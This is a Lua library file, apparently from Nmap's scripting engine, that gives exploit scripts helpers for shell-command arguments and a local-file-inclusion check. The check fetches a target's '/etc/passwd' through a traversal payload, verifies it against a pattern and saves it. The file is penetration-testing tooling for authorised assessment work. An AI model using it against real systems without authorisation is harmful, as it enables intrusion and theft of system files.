---
-- An exploit library for nmap.
--
-- This module provides NSE scripts with an easy way to write exploits for
-- target services, covering what pwntools does for Python, but tailoring
-- the functionality towards what Nmap is typically used for
--
-- Example usage:
-- <code>
-- TODO
-- </code>
--
-- @copyright Same as Nmap--See https://nmap.org/book/man-legal.html

local stdnse = require "stdnse"
local http = require "http"
local string = require "string"
local io = require "io"

local FILE_SIGNATURES = {
  ['passwd'] = '(.*:.*:.*:.*:.*:.*:.*\n)',
  ['/etc/passwd'] = '(.*:.*:.*:.*:.*:.*:.*\n)',
}


_ENV = stdnse.module("exploit", stdnse.seeall)

---
--Writes string to file
--Taken from: hostmap.nse
-- @param filename Filename to write
-- @param contents Content of file
-- @return True if file was written successfully
function write_file(filename, contents)
  local f, err = io.open(filename, "w")
  if not f then
    return f, err
  end
  f:write(contents)
  f:close()
  return true
end

--- Gets the most specifc provided script-args
--  Chooses between the script args "exploit.cmd" and "SCRIPT_NAME.cmd"
--  @param   script_name   the caller script name
--  @return  a string with the most specific cmd to run
function get_shell_cmd(script_name)
  local cmd = stdnse.get_script_args(script_name .. '.cmd') or
    stdnse.get_script_args('exploit.cmd')
  return cmd
end

--- Executes a LFI on the target URI
--  @param  host        the remote target ip to attack
--  @param  port        the port to run to attack against
--  @param  payload     the lfi payload
--  @param  filename    the local file name to include
--  @param  outfile     the output file to save to
--  @return status      the status of the request
--  @return lfi_success the status of the lfi attack
--  @return contents    the contents of the file
function lfi_check(host, port, payload, filename, outfile)
  local l_filename = filename or stdnse.get_script_args("exploit.lfi_file") or "/etc/passwd"
  local outfile = outfile or stdnse.get_script_args("exploit.outfile")

  local uri = payload .. l_filename

  stdnse.debug1("Getting %s", uri)
  local req = http.get(host, port, uri)
  stdnse.debug1("Status code " .. req.status)

  -- response came back
  if req.status and req.status == 200 then
    -- quit if body is empty, meaning file not included
    if string.len(req.body) <= 0 then
      stdnse.debug1("Response was empty using %s", uri)
      return req.status, false, req.body
    end

    local verifiable, verified = false
    -- if there are signatures try to verify them
    if FILE_SIGNATURES[l_filename] then
      verifiable = true
      if l_filename.match(req.body, FILE_SIGNATURES[l_filename]) then
        verified = true
      end
    end

    if outfile then
      local status, err = write_file(outfile, req.body)
      if status then
        stdnse.debug1("%s saved to %s\n", l_filename, outfile)
      else
        stdnse.debug1("Error saving %s to %s: %s\n", l_filename, outfile, err)
      end
    end

    -- we deem it successful if there are known signatures
    local lfi_success = (verifiable and verified) or (not verifiable and req.status)

    return req.status, lfi_success, req.body
  else
    return req.status, false, req.body
  end

end
return _ENV
